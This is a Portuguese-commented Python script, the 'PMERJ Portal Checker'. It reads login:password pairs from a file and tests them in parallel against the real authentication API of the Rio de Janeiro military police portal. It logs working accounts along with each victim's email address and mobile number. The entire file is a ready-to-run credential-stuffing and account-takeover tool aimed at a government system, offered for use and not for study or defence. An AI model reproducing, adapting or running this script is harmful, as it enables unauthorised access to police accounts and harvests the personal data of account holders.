import requests
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import time

init(autoreset=True)

# Configurações
MAX_THREADS = 10  # Número de threads para verificação simultânea
TIMEOUT = 15      # Tempo máximo de espera por requisição
LOGINS_FILE = 'logins.txt'
LIVE_FILE = 'live.txt'
DIE_FILE = 'die.txt'

# Contadores
stats = {
    'total': 0,
    'live': 0,
    'die': 0,
    'error': 0,
    'start_time': time.time()
}

def update_panel():
    elapsed = time.time() - stats['start_time']
    print("\033[H\033[J")  # Limpa o terminal
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.YELLOW + "      PMERJ PORTAL CHECKER")
    print(Fore.CYAN + "══════════════════════════════════")
    print(Fore.GREEN + f" ✅ LIVE: {stats['live']}")
    print(Fore.RED + f" ❌ DIE: {stats['die']}")
    print(Fore.YELLOW + f" ⚠ ERROR: {stats['error']}")
    print(Fore.CYAN + f" ⏳ TEMPO: {elapsed:.2f}s")
    print(Fore.CYAN + "══════════════════════════════════")

def read_credentials_from_file(filename):
    credentials = []
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            for line in file:
                line = line.strip()
                if ':' in line:
                    login, password = line.split(':', 1)
                    credentials.append((login.strip(), password.strip()))
        stats['total'] = len(credentials)
    except Exception as e:
        print(Fore.RED + f"Erro ao ler arquivo: {e}")
    return credentials

def check_login(login, password):
    try:
        url = "https://portal.pmerj.rj.gov.br/190/system_api/authentication"

        headers = {
            "Host": "portal.pmerj.rj.gov.br",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Origin": "https://portal.pmerj.rj.gov.br",
            "Referer": "https://portal.pmerj.rj.gov.br/login",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7"
        }

        payload = {
            "cpf": login,
            "senha": password
        }

        response = requests.post(
            url, 
            headers=headers, 
            json=payload,
            timeout=TIMEOUT
        )

        if response.status_code == 200:
            data = response.json()
            if "error" in data and not data["error"]:
                stats['live'] += 1
                save_result(LIVE_FILE, login, password, data)
                return Fore.GREEN + f"✓ Live {login}" + Style.RESET_ALL + f" | ✉️ {data['email']['email']} | 📱 {data['celular']['numero_celular']}"
            else:
                stats['die'] += 1
                save_result(DIE_FILE, login, password)
                return Fore.RED + f"× Die {login}"
        else:
            stats['error'] += 1
            save_result(DIE_FILE, login, password, f"HTTP {response.status_code}")
            return Fore.RED + f"× Error {login} (HTTP {response.status_code})"

    except Exception as e:
        stats['error'] += 1
        save_result(DIE_FILE, login, password, str(e))
        return Fore.RED + f"× Error {login} - {str(e)[:30]}"

def save_result(filename, login, password, extra_info=None):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            line = f"{login}:{password}"
            if extra_info and isinstance(extra_info, dict):
                line += f" | Email: {extra_info.get('email', {}).get('email', 'N/A')}"
                line += f" | Celular: {extra_info.get('celular', {}).get('numero_celular', 'N/A')}"
            elif extra_info:
                line += f" | {extra_info}"
            f.write(line + "\n")
    except Exception as e:
        print(Fore.RED + f"Erro ao salvar resultado: {e}")

def main():
    # Verificar se o arquivo existe
    if not os.path.exists(LOGINS_FILE):
        print(Fore.RED + f"Arquivo {LOGINS_FILE} não encontrado!")
        return

    # Limpar arquivos de resultados anteriores
    for file in [LIVE_FILE, DIE_FILE]:
        if os.path.exists(file):
            os.remove(file)

    # Ler credenciais
    credentials = read_credentials_from_file(LOGINS_FILE)
    
    if not credentials:
        print(Fore.RED + "Nenhuma credencial válida encontrada!")
        return

    update_panel()

    # Verificar logins com threads
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for login, password in credentials:
            futures.append(executor.submit(check_login, login, password))

        for future in as_completed(futures):
            print(future.result())
            update_panel()

    print(Fore.CYAN + "\n✅ Verificação concluída!")
    print(Fore.CYAN + f"Resultados salvos em {LIVE_FILE} e {DIE_FILE}")

if __name__ == "__main__":
    main()